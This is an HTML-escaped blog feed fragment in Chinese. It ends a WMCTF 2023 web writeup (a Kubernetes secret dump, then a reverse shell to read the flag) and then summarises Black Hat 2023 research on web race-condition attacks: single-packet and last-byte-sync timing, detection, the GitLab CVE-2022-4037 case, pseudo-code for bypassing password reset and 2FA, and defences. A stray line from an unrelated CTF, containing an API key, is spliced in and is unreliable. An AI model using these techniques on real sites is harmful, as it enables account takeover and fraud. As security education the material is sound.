&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:ca.crt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:namespace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:annotations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:kubernetes.io&#x2F;service-account.uid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:labels&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:kubernetes.io&#x2F;legacy-token-last-used&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;manager&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;k3s
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;operation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Update
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-20T06:36:29Z&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ctf-serviceaccount-secret
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;namespace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;default
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;resourceVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;140777&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;uid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;bf517b49-e11d-42da-879c-df84513ce55d
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;kubernetes.io&#x2F;service-account-token
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kind&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;List
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;resourceVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;selfLink&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上面 password 进行 base64 解码得到 key &lt;code&gt;5e9d8189-5c16-4587-9260-4e6b0c86f1eb&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;访问内网 check_service 执行命令&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;NY9WbdcKRohonMxYuVGcAtTRnFf.png)&lt;&#x2F;p&gt;
&lt;p&gt;反弹个 shell 然后执行 &#x2F;readflag&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;ApFMb2PjwolBRdxZCf5cQ6DEn7e.png)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Racing and Smashing the state machine. learn from bh23</title>
        <published>2023-08-17T00:00:00+08:00</published>
        <updated>2023-08-17T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/racing/"/>
        <id>/blog/racing/</id>
        
        <content type="html" xml:base="/blog/racing/">&lt;h1 id=&quot;thesis-content-personal-summary&quot;&gt;Thesis content &amp;amp; Personal summary&lt;&#x2F;h1&gt;
&lt;p&gt;整理总结自&lt;code&gt;jameskettle&lt;&#x2F;code&gt;在&lt;code&gt;Black Hat USA 2023&lt;&#x2F;code&gt;上的发布的演讲主题和文章&lt;code&gt;Smashing the state machine: the true potential of web race conditions&lt;&#x2F;code&gt;&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;，并夹杂个人琐碎的理解和联想。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;limited-exploit&quot;&gt;Limited exploit&lt;&#x2F;h2&gt;
&lt;p&gt;大多数网站使用&lt;strong&gt;多线程&lt;&#x2F;strong&gt;处理并发请求，所有的读写都来自一个&lt;strong&gt;单一的、共享&lt;&#x2F;strong&gt;的数据库。应用程序代码很少考虑到&lt;strong&gt;并发风险&lt;&#x2F;strong&gt;，因此，竞态冒险问题困扰着大量的web应用。竞争问题在此之前集中在极少数的场景中，由于&lt;strong&gt;测试困难、缺乏工具、网络抖动、不可避免的延迟&lt;&#x2F;strong&gt;等因素，这一利用并没有广泛流行、其威胁性没有完整体现。&lt;&#x2F;p&gt;
&lt;p&gt;![race-conditions-discount-code-race](Racing and Smashing the state machine&#x2F;race-conditions-discount-code-race.png)&lt;&#x2F;p&gt;
&lt;p&gt;经典的竞争冒险利用包括&lt;strong&gt;多次应用同一折扣&lt;&#x2F;strong&gt;、&lt;strong&gt;重复提取或转移账户余额的现金&lt;&#x2F;strong&gt;等，基本可以归纳为&lt;strong&gt;Limit-overrun attack&lt;&#x2F;strong&gt;，利用应用存在的的**检查时间，使用时间(time of check, time of use, TOCTOU)**的缺陷，绕过安全保护多次执行受保护操作。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;parallel-transmission-technique&quot;&gt;Parallel transmission Technique&lt;&#x2F;h2&gt;
&lt;p&gt;单包攻击解决了网络抖动，使得每一次攻击都像是在本地系统上进行的，这暴露了以前几乎不可能检测或利用的漏洞。&lt;strong&gt;单包攻击比末字节同步的效率仍然高出一个数量级，如果服务端支持HTTP &#x2F;2应首先选用。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;http-2-single-package-attack-technique&quot;&gt;HTTP 2 - Single Package Attack Technique&lt;&#x2F;h3&gt;
&lt;p&gt;对于&lt;code&gt;HTTP &#x2F;2&lt;&#x2F;code&gt;竞争利用的稳定性，&lt;code&gt;jameskettle&lt;&#x2F;code&gt;采用 USENIX presentation Timeless Timing Attacks&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; 的方式，利用&lt;code&gt;HTTP &#x2F;2&lt;&#x2F;code&gt;&lt;strong&gt;多路复用特性&lt;&#x2F;strong&gt;，在单个连接并发地发送 HTTP 请求，可以使得两个请求直接的间隔极小(&amp;lt;1ms)。这种思路与2020年的一个研究十分相似&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
&lt;p&gt;![9c53-article-blackhat_diagrams-13](Racing and Smashing the state machine&#x2F;9c53-article-blackhat_diagrams-13-16922686162413.png)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;http-1-x-last-byte-sync&quot;&gt;HTTP 1.x - Last-byte sync&lt;&#x2F;h3&gt;
&lt;p&gt;由于HTTP 1.x为每一个请求使用一次TCP连接，无法沿用HTTP2的方法。为了提高&lt;code&gt;HTTP &#x2F;1.x&lt;&#x2F;code&gt;竞争利用的稳定性，&lt;code&gt;jameskettle&lt;&#x2F;code&gt;通过对 Nagle’s algorithm&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#4&quot;&gt;4&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; 创造性滥用，提出了一种&lt;code&gt;末字节同步(last-byte sync technique)&lt;&#x2F;code&gt;的方式，并完成了具体的实现。&lt;&#x2F;p&gt;
&lt;p&gt;*选用一个已有的HTTP 2 library来hook&lt;&#x2F;p&gt;
&lt;p&gt;首先，预先发送每个请求的大部分内容:&lt;&#x2F;p&gt;
&lt;p&gt;如果请求没有正文，则发送所有报头，但不设置 END_STREAM 标志。保留设置了 END_STREAM 的空数据帧。 如果请求有正文，发送 headers 和除了最后一个字节之外的所有正文数据。保留一个包含最后字节的数据段。&lt;&#x2F;p&gt;
&lt;p&gt;接下来，准备发送最后的帧:&lt;&#x2F;p&gt;
&lt;p&gt;等待100ms以确保初始帧已经发送。确保TCP_NODELAY被禁用(Nagle’s algorithm对最后的帧进行批处理是至关重要的)。发送一个ping包来暖化本地连接(如果你不这样做，OS网络栈会把第一个final-frame放在一个单独的数据包中)。&lt;&#x2F;p&gt;
&lt;p&gt;最后，发送被扣留的帧。&lt;&#x2F;p&gt;
&lt;p&gt;![d56c-article-blackhat_diagrams-14](Racing and Smashing the state machine&#x2F;d56c-article-blackhat_diagrams-14-16922686162414.png)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;black-box-detection&quot;&gt;Black-Box detection&lt;&#x2F;h2&gt;
&lt;p&gt;在竞争冒险利用里**复杂度(时间)**是一个关键的因素，他与&lt;code&gt;race window&lt;&#x2F;code&gt;状态的存在时间有较大的关联。有些时候较长时间的响应可能意味着后端处理可能应用到了另外的线程，在有些时候可以作为利用点。&lt;&#x2F;p&gt;
&lt;p&gt;然而值得注意的是，许多应用程序位于前端服务器后面，这些应用程序可能决定将一些请求通过现有连接转发到后端， 并为其他应用程序&lt;strong&gt;创建新的连接&lt;&#x2F;strong&gt;。 因此，不应该将不一致的请求时间归因于应用程序行为，例如只允许单个线程一次访问资源的锁定机制。&lt;strong&gt;前端请求路由&lt;&#x2F;strong&gt;通常是在每个连接的基础上进行的，因此可以通过执行服务器端连接**预热(在执行攻击之前发送一些无关紧要的请求)**来平滑请求时间。&lt;&#x2F;p&gt;
&lt;p&gt;xxxxxxxxxx $ cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD “getFlag()” -r https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 –private-key &amp;lt;64byteskey&amp;gt;  | cut -c3- | xxd -r -p | (cat &amp;amp;&amp;amp; printf “\x0A”) 8TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h}bash&lt;&#x2F;p&gt;
&lt;h3 id=&quot;detailed-method&quot;&gt;Detailed Method&lt;&#x2F;h3&gt;
&lt;p&gt;具体而言，相关测试需要&lt;strong&gt;发送大量的请求&lt;&#x2F;strong&gt;，以最大限度地增加可见副作用的机会，并减轻服务器端的抖动。&lt;&#x2F;p&gt;
&lt;p&gt;可以把这看作是一种&lt;strong&gt;基于混沌的策略&lt;&#x2F;strong&gt;——如果我们看到了一些**有趣(或是不常规)**的事情，我们需要在后面的测试中弄清楚实际发生了什么。 准备好你的混合请求，目标端点和参数，以触发所有相关的代码路径。在可能的情况下，使用多个请求多次触发每个代码路径，使用不同的输入值。&lt;&#x2F;p&gt;
&lt;p&gt;接下来，通过混合发送你的请求，在每个请求之间间隔几秒钟，对端点在正常情况下的行为进行基准测试。 最后，使用单包攻击(如果不支持 HTTP&#x2F;2，则使用 &lt;strong&gt;last-byte sync&lt;&#x2F;strong&gt; )一次性发送所有请求。可以在&lt;code&gt;Turbo Intruder&lt;&#x2F;code&gt;中使用&lt;code&gt;single package attack template&lt;&#x2F;code&gt;，或者在&lt;code&gt;repeater&lt;&#x2F;code&gt;中使用平行发送选项。&lt;&#x2F;p&gt;
&lt;p&gt;分析结果并&lt;strong&gt;以任何偏离基准行为&lt;&#x2F;strong&gt;的方式寻找线索。这可能是一个或多个回复的变化，或者是二阶效应，比如不同的邮件内容，或者是会话中可见的变化。线索可能是微妙的，违反直觉的。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;几乎任何东西&lt;&#x2F;strong&gt;都可以成为线索，但要密切注意请求处理时间。如果它比你预期的时间短，这可能表明数据正在被传递到一个单独的线程，大大增加了漏洞的机会。如果它比你预期的长，这可能表明资源限制或应用程序正在使用锁定来避免并发问题。&lt;&#x2F;p&gt;
&lt;p&gt;要注意的是，PHP 默认锁定 sessionid，因此您需要为批处理中的每个请求使用单独的会话，否则它们将被按照顺序处理。以及越少的同时请求意味着对事件更加敏感、需要更多的测试次数。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;white-box-code-analyze&quot;&gt;White-Box Code Analyze&lt;&#x2F;h2&gt;
&lt;p&gt;从白盒角度分析这竞争冒险漏洞无疑是困难且难以完备的，即使可以获取源代码也应该做大量的黑盒测试。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;cve-2022-4037-gitlab&quot;&gt;CVE-2022-4037 Gitlab&lt;&#x2F;h3&gt;
&lt;p&gt;这是作者在文中提到的唯一白盒示例，已经做了修复&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#5&quot;&gt;5&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:7890
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:7890
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; clone https:&#x2F;&#x2F;gitlab.com&#x2F;gitlab-org&#x2F;gitlab.git
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; gitlab
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; reset --hard 613dbd78
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;GitLab 的仓库较为庞大，如果你对其并不是很熟悉，👆这将是一个错误的决定。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; ..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;rm&lt;&#x2F;span&gt;&lt;span&gt; -rf gitlab&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;GitLab 的认证部分集成了&lt;code&gt;Ruby on rails&lt;&#x2F;code&gt;认证框架&lt;strong&gt;devise&lt;&#x2F;strong&gt;&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#9&quot;&gt;6&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;heartcombo&#x2F;devise&#x2F;blob&#x2F;ec0674523e7909579a5a008f16fb9fe0c3a71712&#x2F;lib&#x2F;devise&#x2F;models&#x2F;confirmable.rb&quot;&gt;&#x2F;lib&#x2F;devise&#x2F;models&#x2F;confirmable.rb&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230816231345119](Racing and Smashing the state machine&#x2F;image-20230816231345119.png)&lt;&#x2F;p&gt;
&lt;p&gt;将传入的表单 email 内容解析，赋值给该实例的&lt;code&gt;unconfirm_email&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230816225924835](Racing and Smashing the state machine&#x2F;image-20230816225924835.png)&lt;&#x2F;p&gt;
&lt;p&gt;这里将&lt;code&gt;Devise.friendly_token&lt;&#x2F;code&gt;给出的 **unique token **赋给了实例变量&lt;code&gt;@raw_confirmation_token&lt;&#x2F;code&gt;，在之后进行了保存。&lt;&#x2F;p&gt;
&lt;p&gt;![image-20230816232622027](Racing and Smashing the state machine&#x2F;image-20230816232622027.png)&lt;&#x2F;p&gt;
&lt;p&gt;将实例变量&lt;code&gt;@raw_confirmation_token&lt;&#x2F;code&gt;以及&lt;code&gt;opts&lt;&#x2F;code&gt;从数据库中加载到&lt;code&gt;send_devise_notification&lt;&#x2F;code&gt;函数中，发送邮件。由于&lt;code&gt;send_devise_notification&lt;&#x2F;code&gt;调用了另外的线程，因而在此过程中会造成&lt;code&gt;race window&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;![未命名绘图.drawio](Racing and Smashing the state machine&#x2F;未命名绘图.drawio.png)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;common-exploitation-categories&quot;&gt;Common exploitation categories&lt;&#x2F;h2&gt;
&lt;p&gt;文中提到的三种竞争冒险利用方式，有一定的交叉部分，并且实际情况中可能不止这四种。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Limit-overrun: 传统的 racing 方法，建立在TOCTOU的基础上，通过对某一限制的&lt;strong&gt;竞争滥用&lt;&#x2F;strong&gt;，实现受保护操作的重复执行。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Single-endpoint collisions: 单请求的重复发送，难以白盒探测这一问题，而&lt;strong&gt;后端复杂性&lt;&#x2F;strong&gt;给予了这一类漏洞较大的影响。上文提到的CVE-2022-4037就属这一类。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Multi-endpoint collisions: &lt;strong&gt;多请求、多结束点&lt;&#x2F;strong&gt;的利用。在复杂请求的过程中执行简单请求中插入简单请求，使得传递的未检验数据接触到受保护操作。具体可见下文的 Practice writeup。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;defence&quot;&gt;Defence&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;避免混合不同时刻的数据&lt;&#x2F;strong&gt;。案例中设计库从数据库中读取令牌，然后通过电子邮件将其发送到保存在实例变量中的地址。如果它从数据库中同时读取了令牌和电子邮件地址，或者将它们都传递到实例变量中，它就不会受到攻击。&lt;&#x2F;p&gt;
&lt;p&gt;通过使用 datastore 的并发特性，&lt;strong&gt;确保敏感端点使状态更改原子化&lt;&#x2F;strong&gt;。例如，使用单一数据库事务来检查付款是否匹配 cart 值并确认订单。作为深度防御措施，利用数据存储完整性&#x2F;一致性特征，如唯一性约束。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;不要试图使用一个数据存储层来保护另一个&lt;&#x2F;strong&gt;。例如，会话不适合防止对数据库的限制-超出攻击。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;确保你的会话处理框架保持会话内部一致&lt;&#x2F;strong&gt;。单独更新会话变量而不是批量更新可能是一个不错的优化，但它是极其危险的。这也适用于 ORMs 通过隐藏像 transactions 这样的概念，他们为它们承担全部责任。&lt;&#x2F;p&gt;
&lt;p&gt;在某些架构中，完全避免服务器端状态可能是合适的，而是使用加密来推送状态客户端，如 JWT。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;future-research&quot;&gt;Future Research&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Applied Range: 竞争的应用范围目前基本局限于Web应用，然而竞态冒险并不局限于特定的&lt;code&gt;web-app&lt;&#x2F;code&gt;架构。多线程单数据库应用程序是最容易推理的，但更复杂的设置通常会导致状态存储在更多的地方，而&lt;code&gt;ORMs&lt;&#x2F;code&gt;只是将危险隐藏在抽象层之下。像 NodeJS 这样的单线程系统暴露的稍微 少一些，但最终仍然可能容易受到攻击。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Partial construction attacks: 部分构造攻击是数据结构在做出完整改变之前的状态未被限制访问，造成的中间态。下文会就相关的 pj0 的 WebRTC 研究做出简单总结。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Single-packet attack enhancements: 单包攻击自身的优化，针对&lt;code&gt;延迟multi-endpoint单个数据包中特定请求的处理&lt;&#x2F;code&gt;，&lt;code&gt;总体支持的最大并行数量&lt;&#x2F;code&gt;、&lt;code&gt;从TCP转移到TLS层利用&lt;&#x2F;code&gt;三个层面。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Unsafe data structures: 一、数据结构层在现实中应对竞争的方式——锁定。然而这一方式对于效率而言过于激进。因而有些时候锁定针对的是单个会话，这是如果使用两个单独的会话，该漏洞仍然是可利用的。二、批处理的结构使得开始处理一个请求时，它们会读取整个记录，将随后的读&#x2F;写操作应用于该记录的本地内存副本，然后当请求处理完成时，整个记录被序列化回数据库。但如果两个请求同时对同一条记录进行操作，其中一个将最终从另一个重写数据库的更改。这意味着它们不能用来防御影响其他存储层的攻击。三、无保护是最常见的结构，并且是最容易利用的。&lt;&#x2F;p&gt;
&lt;p&gt;paper中给出无保护下的可利用片段如下（应该事python）：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Bypass code-based password reset
&lt;&#x2F;span&gt;&lt;span&gt;session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;reset_username&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;username
&lt;&#x2F;span&gt;&lt;span&gt;session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;reset_code&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;randomCode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;Exploit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Simultaneous reset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; $your-username &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#d8dee9;&quot;&gt;and&lt;&#x2F;span&gt;&lt;span&gt; $victim-username
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Bypass 2FA
&lt;&#x2F;span&gt;&lt;span&gt;session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;user&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;username
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt; 2fa_enabled:
&lt;&#x2F;span&gt;&lt;span&gt;    session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;require2fa&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;true
&lt;&#x2F;span&gt;&lt;span&gt;Exploit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Simultaneous login &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;sensitive page fetch
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Session-swap
&lt;&#x2F;span&gt;&lt;span&gt;session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;user&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;username
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_auth_cookies_for&lt;&#x2F;span&gt;&lt;span&gt;(session[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;user&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;])
